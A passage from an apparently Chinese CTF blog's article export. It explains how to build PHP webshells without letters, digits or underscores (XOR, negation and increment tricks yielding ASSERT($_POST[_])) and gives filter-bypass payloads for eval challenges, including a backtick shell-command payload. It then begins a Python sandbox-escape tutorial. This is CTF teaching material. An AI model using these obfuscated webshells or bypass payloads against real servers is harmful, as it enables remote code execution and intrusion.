P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id=\"限制长度\"><a href=\"#限制长度\" class=\"headerlink\" title=\"限制长度\"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>题目：</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p>\n<p>可以通过连续调用异或来获得 <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p>\n<p>最后传入参数 getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p>\n<p>事实上下面这也可以：</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p>\n<h2 id=\"不用数字字母和下划线\"><a href=\"#不用数字字母和下划线\" class=\"headerlink\" title=\"不用数字字母和下划线\"></a>不用数字字母和下划线</h2><p>题目：</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>通过上面的取反就可以了</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\n输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p>\n<p>还有更骚的，用中文：</p>\n<pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p>\n<h2 id=\"不用数字、字母、-、\"><a href=\"#不用数字、字母、-、\" class=\"headerlink\" title=\"不用数字、字母、_、$\"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>\n<p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosé will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","text":"特殊的webshell实验环境 ：php 5.45+nts+apachephp5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。但 php7中，assert不再是函数，变成了一个语言结构（类似eval），","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"python沙盒逃逸:从头开始","slug":"python沙箱逃逸","date":"2019-10-11T06:26:44.000Z","updated":"2019-10-14T12:20:33.712Z","comments":true,"path":"api/articles/python沙箱逃逸.json","excerpt":"","keywords":null,"cover":"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg","content":"<p>10/11/2019 2:26:44 PM </p>\n<h1 id=\"Python-沙箱逃逸你真的看懂了么？\"><a href=\"#Python-沙箱逃逸你真的看懂了么？\" class=\"headerlink\" title=\"Python 沙箱逃逸你真的看懂了么？\"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p>\n<p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p>\n<p>接下来让我们先了解一下 python 的两个非常重要的东西</p>\n<h2 id=\"type-amp-object\"><a href=\"#type-amp-object\" class=\"headerlink\" title=\"type &amp; object\"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p>\n<pre><code>&gt;&gt;&gt; object\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; type\n&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p>\n<p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p>\n<pre><code>&gt;&gt;&gt; object.__class__\n&lt;type &apos;type&apos;&gt;\n\n&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类\n()\n\n&gt;&gt;&gt; type.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__    #type 的类型是自己\n&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p>\n<pre><code>&gt;&gt;&gt; list.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__\n&lt;type &apos;type&apos;&gt;\n&gt;&gt;&gt; dict.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; dict.__class__\n&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p>\n<p>我们把他们放在一个表里看看：</p>\n<p><img src=\"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg\" alt></p>\n<p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p>\n<h2 id=\"builtin、builtins、builtins-是什么？\"><a href=\"#builtin、builtins、builtins-是什么？\" class=\"headerlink\" title=\"builtin、builtins、builtins 是什么？\"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p>\n<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p>\n<p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p>\n<pre><code>&gt;&gt;&gt; import __builtin__\n&gt;&gt;&gt; def print_hello():\n...     print &quot;hello world!&quot;\n...\n&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello\n&gt;&gt;&gt; print_hello()\nhello world!\n&gt;&gt;&gt; hello()\nhello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p>\n<p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p>\n<p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p>\n<ol>\n<li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li>\n<li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li>\n</ol>\n<p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p>\n<pre><code>&gt;&gt;&gt; dir(__builtins__)\n[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p>\n<p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p>\n<h2 id=\"Python-有哪些可以执行系统命令呢？\"><a href=\"#Python-有哪些可以执行系统命令呢？\" class=\"headerlink\" title=\"Python 有哪些可以执行系统命令呢？\"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p>\n<p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p>\n<pre><code>#-*- coding:utf8 -*-\n# By Macr0phag3\n# in 2019-05-07 19:46:12\n# ------------------------------------\n\n# this, antigravity 库删掉\nall_modules_2 = [\n    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;\n]\n\nall_modules_3 = [\n    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, &apos;asn1crypto&apos;, &apos;inspect&apos;, &apos;shelve&apos;, &apos;UpdateManager&apos;, &apos;ast&apos;, &apos;io&apos;, &apos;shlex&apos;, &apos;__future__&apos;, &apos;asynchat&apos;, &apos;ipaddress&apos;, &apos;shutil&apos;, &apos;_ast&apos;, &apos;asyncio&apos;, &apos;itertools&apos;, &apos;signal&apos;, &apos;_asyncio&apos;, &apos;asyncore&apos;, &apos;janitor&apos;, &apos;simplejson&apos;, &apos;_bisect&apos;, &apos;atexit&apos;, &apos;json&apos;, &apos;site&apos;, &apos;_blake2&apos;, &apos;audioop&apos;, &apos;keyring&apos;, &apos;sitecustomize&apos;, &apos;_bootlocale&apos;, &apos;base64&apos;, &apos;keyword&apos;, &apos;six&apos;, &apos;_bz2&apos;, &apos;bdb&apos;, &apos;language_support_pkgs&apos;, &apos;smtpd&apos;, &apos;_cffi_backend&apos;, &apos;binascii&apos;, &apos;launchpadlib&apos;, &apos;smtplib&apos;, &apos;_codecs&apos;, &apos;binhex&apos;, &apos;linecache&apos;, &apos;sndhdr&apos;, &apos;_codecs_cn&apos;, &apos;bisect&apos;, &apos;locale&apos;, &apos;socket&apos;, &apos;_codecs_hk&apos;, &apos;brlapi&apos;, &apos;logging&apos;, &apos;socketserver&apos;, &apos;_codecs_iso2022&apos;, &apos;builtins&apos;, &apos;louis&apos;, &apos;softwareproperties&apos;, &apos;_codecs_jp&apos;, &apos;bz2&apos;, &apos;lsb_release&apos;, &apos;speechd&apos;, &apos;_codecs_kr&apos;, &apos;cProfile&apos;, &apos;lzma&apos;, &apos;speechd_config&apos;, &apos;_codecs_tw&apos;, &apos;cairo&apos;, &apos;macaroonbakery&apos;, &apos;spwd&apos;, &apos;_collections&apos;, 